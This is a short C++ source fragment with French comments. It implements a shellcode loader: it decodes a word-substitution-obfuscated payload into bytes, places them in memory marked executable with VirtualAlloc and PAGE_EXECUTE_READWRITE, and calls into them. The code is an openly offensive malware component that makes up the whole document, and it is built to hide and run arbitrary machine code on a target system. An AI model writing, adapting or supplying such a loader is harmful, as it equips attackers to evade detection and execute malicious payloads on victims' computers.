std::string decodePayload(const std::string& encoded) {
std::istringstream iss(encoded);
std::string word;
std::string decoded = "";
while (iss >> word) {
    auto it = std::find_if(wordDict.begin(), wordDict.end(), [&](const std::pair<std::string, uint8_t>& pair) {
        return pair.second == wordDict[word];
    });
    if (it != wordDict.end()) {
        decoded += static_cast<char>(it->second);  // Convertit uint8_t en char
    } else {
        std::cerr << "[!] Erreur de décodage : mot inconnu " << word << std::endl;
    }
}
return decoded;
}
    



void executePayload(const std::string& payload) {
    void* exec_mem = VirtualAlloc(0, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    std::memcpy(exec_mem, payload.data(), payload.size());
    auto func = reinterpret_cast<void(*)()>(exec_mem);
    std::cout << "[+] Execution du payload..." << std::endl;
    func();
}
    



int main() {
    std::string decoded_payload = decodePayload(obf_data);
    executePayload(decoded_payload);
    return 0;
}
    